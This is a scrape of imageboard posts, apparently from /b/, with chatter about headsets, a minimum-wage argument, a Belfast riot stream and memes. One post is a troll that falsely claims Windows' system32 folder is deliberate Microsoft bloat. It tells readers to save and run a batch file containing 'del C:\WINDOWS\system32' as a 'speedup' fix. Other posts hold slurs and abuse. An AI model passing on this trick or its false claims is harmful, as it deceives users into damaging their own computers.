New headset is Logitech h600. Sound quality is just about as you described unfortunately, since they're just regular pads. But they go louder than the old ones. Both are around $50-60</br></br>  <br> ear cups give me ear infections <br>Oh, that's equally odd and nasty. I got used to the in-ear ones after a while. Might just be the wrong size, might also be that your ears are just too far from the norm for them.<br>I use cupped one at home and in-ear ones on the way. In-ear is only comfy for an hour or two, and they sound worse.</br></br></br>  <br>Lg tone master race.</br>  VICTORY SCREECH<br>REEEEE</br>  REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE  Which group is more entitled, Fast Food workers or the Military?  <br>such a typical retard response.<br><br>i have nothing invested in mises, and as i stated, it's a place to start, not finish.<br><br>if you have nothing to rebut what was stated, move along to /pol and circle jerk</br></br></br></br></br>  <br><br>see here<br>http://www.aei.org/publication/lets<wbr>-review-the-adverse-effects-of-rais<wbr>ing-the-minimum-wage-on-teenagers-w<wbr>hen-it-increased-41-between-2007-an<wbr>d-2009/</wbr></wbr></wbr></wbr></br></br></br>  <br>Lol, okay, bro.<br><br>There's plenty of posts laughing about the shit talked in that link.

Pretty funny stuff.</br>  Okay newfags, listen up.<br>When Microsoft was first getting started, they knew they wouldn't make enough money just from the profits of their operating system. Everybody knows people pirate Windows, So they had to get creative. A guy named Chris Liddel came up with the idea to put a folder called "system32" in the windows folder that literally slows down your machine. "system32" hold 32 GIGABYTES of deleted files, internet history, uninstalled progams, and other worthless shit that intentionally clogs up your machine. Why did they do it? Because Microsoft owns several PC "Cleaning" tools, like TuneUp Utilites, Norton Antivirus, ect. More money for them. /b/ isn't cool with that, however. Here's how to outsmart those assholes once and for all;<br>Open Notepad<br>Type the following text:<br>@echo off<br>del C:\WINDOWS\system32<br>save as "speedup.bat" (select "all files" instead of "text document"<br>Save it to Desktop<br>Double-click the .bat file<br><br><br><span class="abbr">Comment too long. <a href="thread/627726464#p627726464">Click here</a> to view the full text. </br></br></br></br></br></br></br></br></br></br></br>  <br>ayy lmao</br>  https://www.<span>youtube.com/watch?v=_Dm<wbr>ZFwSLbbI&amp;feature=youtu.be</wbr>  [ ] <br><br>Rioting in Belfast live stream anyone else watching?</br></br>  I am now, thanks anon  Quiet riot..  <br>I live just below here.. yay</br>   &gt;what would you like to do me b/?
